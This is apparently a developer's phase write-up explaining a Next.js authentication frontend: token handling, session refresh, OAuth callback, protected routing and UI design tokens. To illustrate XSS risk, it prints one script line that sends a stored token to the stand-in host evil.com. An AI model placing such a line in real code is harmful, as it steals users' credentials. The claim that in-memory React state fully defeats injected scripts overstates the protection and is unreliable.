# Phase 1.4 — Auth Frontend
**Status:** DONE  
**Date:** 2026-06-20  
**Goal:** Build the complete client-side authentication layer — login page, session management, protected routing, and the sidebar shell — so the app has a working, secure UI that connects to the Phase 1.3 backend.

---

## What Was Built

```
frontend/
├── app/
│   ├── globals.css                        ← full design token system + animations
│   ├── layout.tsx                         ← root layout: fonts, AuthProvider wrapper
│   ├── page.tsx                           ← / → redirects to /dashboard
│   ├── _lib/
│   │   └── api.ts                         ← fetch wrapper: Bearer token + auto-refresh
│   ├── _components/
│   │   ├── auth-provider.tsx              ← React context: token in memory, user state
│   │   └── sidebar.tsx                    ← sidebar nav with user avatar + logout
│   ├── (auth)/
│   │   ├── login/
│   │   │   └── page.tsx                   ← full-screen login, "Continue with Google"
│   │   └── callback/
│   │       └── page.tsx                   ← reads ?token=, stores in context, redirects
│   └── (dashboard)/
│       ├── layout.tsx                     ← protected layout: auth guard + sidebar
│       └── dashboard/
│           └── page.tsx                   ← placeholder dashboard (Phase 2 fills this)
```

**New packages:**
- `framer-motion` — animation library (stat counters, page transitions in Phase 2)
- `lucide-react` — icon library (no emojis anywhere in the UI)

---

## Concepts Explained

### 1. Design Token System — `globals.css`

Raw CSS values scattered across components are unmaintainable. A design token system centralizes every color, spacing value, and animation — one source of truth that the whole UI reads from.

```css
:root {
  --bg-base:            #070B14;
  --bg-surface:         #0F1623;
  --primary-500:        #6366F1;
  --success-400:        #34D399;
  --text-primary:       #F1F5F9;
  --text-muted:         #64748B;
  /* ... */
}
```

These are CSS custom properties — they live on the `:root` element and are accessible everywhere in the page.

**Tailwind v4 `@theme inline` block** maps those CSS variables into Tailwind's utility system:

```css
@theme inline {
  --color-bg-base:    var(--bg-base);
  --color-primary-500: var(--primary-500);
  /* ... */
}
```

After this mapping, you can write `bg-bg-base`, `text-primary-500`, `border-border-subtle` as Tailwind classes — and they resolve to our design tokens at build time.

**Why two layers (CSS vars + @theme)?**  
- CSS vars are readable at runtime — JavaScript can access them via `getComputedStyle`
- `@theme` makes them Tailwind utilities — you get autocomplete, purging, and responsive variants
- Recharts (charts library) cannot use CSS vars — it needs raw hex values. The `:root` vars solve this: `getComputedStyle(document.documentElement).getPropertyValue('--primary-500')`

**Global animations defined here:**

```css
@keyframes flame-pulse {
  0%, 100% { transform: scale(1); }
  50%       { transform: scale(1.08); }
}
.animate-flame { animation: flame-pulse 2s ease-in-out infinite; }

@keyframes shimmer {
  0%   { background-position: -200% 0; }
  100% { background-position:  200% 0; }
}
.skeleton { background: linear-gradient(...); animation: shimmer 1.5s infinite; }
```

And the all-important reduced-motion rule — users who have vestibular disorders or motion sensitivity set `prefers-reduced-motion: reduce` in their OS. We respect it:

```css
@media (prefers-reduced-motion: reduce) {
  .animate-flame, .skeleton { animation: none; }
  * { transition-duration: 0.01ms !important; }
}
```

---

### 2. Root Layout — Fonts and Provider Wiring

```tsx
import { Inter, JetBrains_Mono } from "next/font/google";

const inter = Inter({ variable: "--font-inter", subsets: ["latin"] });
const jetbrainsMono = JetBrains_Mono({ variable: "--font-jetbrains-mono", subsets: ["latin"] });
```

**`next/font/google`** downloads fonts at build time and self-hosts them. This means:
- No external request to `fonts.googleapis.com` at runtime — faster load
- No GDPR risk from third-party font tracking
- Fonts are subset to `latin` — only the characters we need, smaller file

The font is exposed as a CSS variable (`--font-inter`), which `globals.css` maps into Tailwind's `--font-sans`. Every component inherits it automatically.

**Why Inter + JetBrains Mono?**

| Font | Role | Why |
|---|---|---|
| Inter | All UI text | Screen-optimized, neutral, used by Linear/Vercel/Notion. Readable at any size. |
| JetBrains Mono | All numbers/stats | Monospace digits align in tables and rating displays. The CP context makes it feel technical and precise. |

The `AuthProvider` wraps `{children}` here so every page in the app has access to auth state:

```tsx
<body className="min-h-full bg-bg-base text-text-primary">
  <AuthProvider>{children}</AuthProvider>
</body>
```

---

### 3. Route Groups — `(auth)` and `(dashboard)`

Next.js App Router lets you group routes with parentheses: `(auth)` and `(dashboard)` are **route groups** — the folder name is omitted from the URL.

```
app/(auth)/login/page.tsx    →  URL: /login
app/(auth)/callback/page.tsx →  URL: /callback
app/(dashboard)/dashboard/page.tsx  →  URL: /dashboard
```

**Why group them?**  
Each group can have its own `layout.tsx`. The auth pages (`/login`, `/callback`) have a full-screen centered layout with no sidebar. The dashboard pages have the sidebar + protected auth check. Without groups, you'd need to manually exclude the sidebar on auth pages.

```
app/
├── (auth)/layout.tsx       ← full-screen, no sidebar
├── (dashboard)/layout.tsx  ← sidebar + auth guard
```

---

### 4. `AuthProvider` — Token in Memory, Not Storage

This is the most security-critical piece of the frontend.

```tsx
"use client";

const [token, setTokenState] = useState<string | null>(null);
const [user, setUser] = useState<User | null>(null);
const [isLoading, setIsLoading] = useState(true);
```

**Why `useState` and not `localStorage`?**

`localStorage` is readable by any JavaScript running on the page — including injected scripts from XSS attacks. If an attacker injects `<script>fetch('https://evil.com?t='+localStorage.token)</script>`, they steal the token.

`useState` lives only in JavaScript memory. It's inaccessible from outside the React component tree. There is no API to read another component's state from an injected script.

**Trade-off:** The token is gone on page refresh. Solved by session restoration.

**Session restoration on mount:**

```tsx
useEffect(() => {
  async function restore() {
    try {
      const res = await fetch(`${API_URL}/api/v1/auth/refresh`, {
        method: "POST",
        credentials: "include", // sends the httpOnly cookie automatically
      });
      if (res.ok) {
        const data = await res.json();
        setTokenState(data.access_token);
        await fetchUser(data.access_token);
      }
    } finally {
      setIsLoading(false);
    }
  }
  restore();
}, []);
```

When the page loads:
1. `isLoading = true` — the dashboard shows a spinner, not a redirect to /login
2. We silently call `POST /auth/refresh` — the browser automatically sends the `httpOnly` cookie
3. If the cookie is valid → we get a new access token → session restored, user stays logged in
4. If the cookie is expired/missing → no token → user gets redirected to /login
5. Either way, `isLoading = false` — the spinner goes away

This is how users "stay logged in" across browser restarts without ever putting the token in storage.

**`credentials: "include"`** — this flag tells `fetch` to send cookies cross-origin. Without it, the browser silently drops the cookie and the refresh always fails.

---

### 5. `apiFetch` — Auto-Refresh on 401

Every API call in the app goes through this wrapper instead of calling `fetch` directly.

```typescript
export async function apiFetch(path, options, onTokenRefreshed) {
  // 1. Attach Bearer token
  const headers = { Authorization: `Bearer ${token}` };
  const res = await fetch(`${API_BASE}${path}`, { headers, credentials: "include" });

  // 2. If 401 — try to refresh
  if (res.status === 401 && token) {
    const newToken = await getRefreshedToken();
    if (!newToken) return res; // refresh failed, let caller handle

    if (onTokenRefreshed) onTokenRefreshed(newToken); // update state in AuthProvider

    // 3. Retry original request with new token
    return fetch(`${API_BASE}${path}`, { headers: { Authorization: `Bearer ${newToken}` } });
  }

  return res;
}
```

**The deduplication problem:**

Imagine the dashboard loads and fires 5 API requests simultaneously. The access token is expired, so all 5 get `401`. Without deduplication, all 5 would try to call `POST /auth/refresh` — that's 5 concurrent rotations, which breaks token rotation (the second rotation invalidates the first's result).

**Solution: `refreshPromise` singleton:**

```typescript
let refreshPromise: Promise<string | null> | null = null;

async function getRefreshedToken(): Promise<string | null> {
  if (!refreshPromise) {
    refreshPromise = doRefresh().finally(() => { refreshPromise = null; });
  }
  return refreshPromise; // all callers await the same promise
}
```

The first call to `getRefreshedToken()` creates the promise. The next 4 calls find `refreshPromise` already set — they await the same promise. One refresh fires, four requests piggyback on its result. Clean and correct.

---

### 6. Login Page — `/login`

```tsx
// Server Component — no 'use client' needed
export default function LoginPage() {
  return (
    <main className="min-h-screen bg-bg-base flex items-center justify-center">
      {/* Subtle gradient blob — CSS only, no JS */}
      <div style={{ background: "radial-gradient(...)", filter: "blur(80px)" }} />

      {/* Card */}
      <a href={`${API_URL}/api/v1/auth/google`}>
        {/* Google SVG logo — no emoji, no external image request */}
        Continue with Google
      </a>
    </main>
  );
}
```

**Why a Server Component for the login page?**  
The login page has no interactivity — no `useState`, no `useEffect`, no event handlers. It's a static page that renders an `<a>` tag. Server Components render on the server and send pure HTML — no JavaScript bundle shipped to the client for this page.

**Why `<a href=...>` and not `<button onClick=...>`?**  
The OAuth redirect must be a full browser navigation — not a `fetch()` call. We need the browser to follow the redirect chain from our backend to Google and back. An `<a>` tag does a real navigation. A `fetch()` would follow the redirect server-side and return the Google HTML, which is wrong.

**The background gradient blob:**  
A single `<div>` with a radial gradient and `blur(80px)`. No images, no libraries. Creates a subtle depth effect that makes the dark background feel premium rather than flat.

**Google logo:**  
Inline SVG with Google's exact brand colors. No external image request, no `<img>` that can fail to load, works offline.

---

### 7. Callback Page — `/auth/callback`

This is where the OAuth flow lands after the backend redirects.

```tsx
"use client";

function CallbackHandler() {
  const { login } = useAuth();
  const router = useRouter();
  const params = useSearchParams(); // reads ?token=eyJ...

  useEffect(() => {
    const token = params.get("token");
    if (token) {
      login(token);                                   // store in React state
      window.history.replaceState({}, "", "/auth/callback"); // remove token from URL
      router.replace("/dashboard");                   // navigate
    } else {
      router.replace("/login");
    }
  }, []);
}
```

**Why remove the token from the URL?**  
The URL bar is visible. Browsers log visited URLs in history. Some browser extensions read the URL. Leaving `?token=eyJ...` in the address bar is a security leak — someone who looks at the URL after login could copy the access token. `replaceState` rewrites the URL without adding a history entry, so the back button doesn't bring the token back.

**Why `Suspense` is required here:**

```tsx
export default function CallbackPage() {
  return (
    <Suspense fallback={<Loader />}>
      <CallbackHandler />  {/* uses useSearchParams() */}
    </Suspense>
  );
}
```

`useSearchParams()` is a client-side-only API — the URL search params don't exist on the server. Next.js 16 requires any component using `useSearchParams()` to be wrapped in `<Suspense>` so the server can render a fallback while the client hydrates. Without it, the build fails with an error. This is a new constraint in Next.js 16 — it did not exist in Next.js 13/14.

---

### 8. Protected Dashboard Layout

```tsx
"use client";

export default function DashboardLayout({ children }) {
  const { token, isLoading } = useAuth();
  const router = useRouter();

  useEffect(() => {
    if (!isLoading && !token) {
      router.replace("/login");
    }
  }, [token, isLoading, router]);

  if (isLoading) return <Spinner />;
  if (!token) return null; // prevents flash of protected content

  return (
    <div className="flex min-h-screen">
      <Sidebar />
      <main className="flex-1 p-6">{children}</main>
    </div>
  );
}
```

**Three states to handle:**

| State | What renders | Why |
|---|---|---|
| `isLoading = true` | Spinner | Session restoration is in progress. We don't know yet if the user is logged in. Show nothing meaningful. |
| `isLoading = false, token = null` | `null` (then redirect) | Unauthenticated. `null` prevents a flash of the dashboard UI before the redirect fires. |
| `isLoading = false, token = set` | Sidebar + children | Authenticated. Render the app. |

**Why `router.replace` and not `router.push`?**  
`replace` doesn't add to the browser history stack. If you used `push`, a user on the dashboard would hit the back button and land on the dashboard again (before the auth check runs), creating a confusing loop. `replace` swaps the history entry — back button goes to wherever they were before login.

**Why a Client Component layout?**  
The auth check reads from React context (`useAuth()`), which requires `useState` and `useEffect`. These only work in Client Components. The layout must be `"use client"`.

---

### 9. Sidebar

```tsx
const NAV_ITEMS = [
  { href: "/dashboard", label: "Dashboard", icon: LayoutDashboard },
  { href: "/contests",  label: "Contests",  icon: Calendar,      disabled: true },
  { href: "/handles",   label: "Handles",   icon: Link2,         disabled: true },
  { href: "/classroom", label: "Classroom", icon: GraduationCap, disabled: true },
];
```

Unbuilt sections are `disabled: true` — they render as non-interactive `<span>` with `text-disabled` color. Users can see what's coming without being able to click into broken pages.

**Active state detection:**

```tsx
const pathname = usePathname(); // e.g. "/dashboard"
const active = pathname === href;
```

`usePathname()` reads the current URL path. The active nav item gets `bg-primary-500/10 text-primary-400` — a subtle indigo pill that matches the design system.

**User row at the bottom:**

```tsx
{user.avatar_url ? (
  <img src={user.avatar_url} className="w-7 h-7 rounded-full" />
) : (
  <div className="w-7 h-7 rounded-full bg-primary-600">
    {user.name.charAt(0).toUpperCase()}
  </div>
)}
```

Google provides a profile picture URL. If it's missing (some accounts don't have one), we fall back to an indigo circle with the user's first initial — same pattern used by Linear, Notion, and GitHub.

---

### 10. `_lib/` and `_components/` — Private Folders

Files prefixed with `_` in the `app/` directory are **private** — Next.js will not create routes from them. `_lib/api.ts` and `_components/auth-provider.tsx` are not pages; they're shared utilities. The `_` prefix communicates "this is not a route" and prevents accidental exposure.

---

## Verification

```bash
cd frontend

# Install dependencies (already done)
npm install

# Start dev server
npm run dev
# → http://localhost:3000

# Build check (TypeScript + static analysis)
npm run build
# → ✓ Compiled successfully
# → ✓ Generating static pages (7/7)

# Manual flow test (requires backend running + Google credentials in .env)
# 1. Visit http://localhost:3000 → redirects to /dashboard
# 2. /dashboard → isLoading=true → tries refresh → no cookie → redirects to /login
# 3. /login → "Continue with Google" button visible
# 4. Click → goes to http://localhost:8000/api/v1/auth/google → Google consent
# 5. After Google login → backend redirects to /auth/callback?token=eyJ...
# 6. Callback page stores token, clears URL, redirects to /dashboard
# 7. /dashboard → sidebar shows user name + avatar → welcome message
# 8. Logout button → POST /auth/logout → clears cookie → back to /login
```

---

## Key Takeaways

1. **Token in `useState`, never `localStorage`** — React state is inaccessible to injected scripts. `localStorage` is not. This is the core XSS defense on the frontend.
2. **Session restoration via refresh cookie** — the `httpOnly` cookie is invisible to JS but the browser sends it automatically. On mount, we silently refresh and restore the session. Users stay logged in across page refreshes.
3. **`credentials: "include"`** — without this flag on every `fetch`, the browser drops the cookie on cross-origin requests. Auth silently breaks.
4. **Deduplicated refresh** — a singleton `Promise` ensures that concurrent 401s fire exactly one refresh call. Without this, token rotation breaks under concurrent requests.
5. **`useSearchParams()` needs `<Suspense>`** — Next.js 16 requirement. Any component using `useSearchParams()` must be wrapped. The build fails without it — enforced at compile time.
6. **`router.replace` not `router.push`** — replace swaps the history entry. Push adds one. For auth redirects, replace prevents the back-button loop.
7. **Route groups `(auth)` / `(dashboard)`** — organize routes into layout families without affecting URLs. Auth pages get a full-screen layout; dashboard pages get the sidebar.
8. **Design tokens in CSS vars + Tailwind `@theme`** — two layers: CSS vars for runtime access (JS, Recharts), `@theme` for Tailwind utility classes. One change in `:root` updates the whole UI.
9. **`next/font` self-hosts Google Fonts** — no runtime request to Google, no GDPR issue, subset to `latin` for smaller file size.
10. **`disabled` nav items are visible but unclickable** — shows the product roadmap without routing to broken pages. Better UX than hiding unbuilt features entirely.

---

## Next: Phase 1.5 — Database: Handle Table

Create the `user_handles` table with platform enum, verification fields, sync status, and the unique constraint `(user_id, platform, is_active)`.
